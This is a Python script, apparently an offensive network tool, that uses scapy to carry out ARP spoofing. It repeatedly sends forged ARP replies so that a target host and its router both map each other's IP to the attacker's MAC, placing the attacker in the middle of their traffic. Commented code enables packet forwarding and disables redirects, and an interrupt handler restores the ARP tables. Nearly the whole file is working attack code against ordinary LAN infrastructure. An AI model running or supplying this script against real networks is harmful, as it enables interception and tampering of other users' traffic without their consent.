import sys
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, getmacbyip
from getmac import get_mac_address 

# echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
# echo 0 > /proc/sys/net/ipv4/conf/default/send_redirects
# echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects (replace eth0 with your interface)

# turn on forwarding and disable redirects
#def setting_forward_redirect(interface):
    # subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
    # subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.send_redirects=0"], stdout=subprocess.DEVNULL)
    # subprocess.run(["sysctl", "-w", "net.ipv4.conf.default.send_redirects=0"], stdout=subprocess.DEVNULL)
    # subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{interface}.send_redirects=0"], stdout=subprocess.DEVNULL)

# spoofing arp with sending arp reply packets
def arp_spoof(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(Ether(dst=dest_mac)/packet, verbose=False)

# restore arp table on the both machines 
def arp_restore(dest_ip, dest_mac, source_ip, source_mac): # Optional beacuse victim and router automaticly will set up old variables
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(Ether(dst=dest_mac)/packet, verbose=False)

def main():
    # get args from terminal
    target_ip = sys.argv[1]
    router_ip = sys.argv[2]
    interface = sys.argv[3]

    # setting_forward_redirect(interface=interface)
    target_mac = getmacbyip(target_ip)
    router_mac = getmacbyip(router_ip)
    hacker_mac = get_mac_address() 
    if not target_ip or not target_mac:
        print("[-] Could not find MAC address. Exiting.")
        sys.exit(0)
    try:
        print("[+] Sending spoofed ARP packets...")
        while True:
            arp_spoof(
                dest_ip=target_ip,
                dest_mac=target_mac,
                source_ip=router_ip,
                source_mac=hacker_mac)
            arp_spoof(
                dest_ip=router_ip,
                dest_mac=router_mac,
                source_ip=target_ip,
                source_mac=hacker_mac)
    except KeyboardInterrupt:
        print("[+] Restoring ARP Tables...")
        arp_restore(dest_ip=router_ip, dest_mac=router_mac, source_ip=target_ip, source_mac=target_mac)
        arp_restore(dest_ip=target_ip, dest_mac=target_mac, source_ip=router_ip, source_mac=router_mac)
        print("[-] End of spoofing!")
        quit()
    
main()

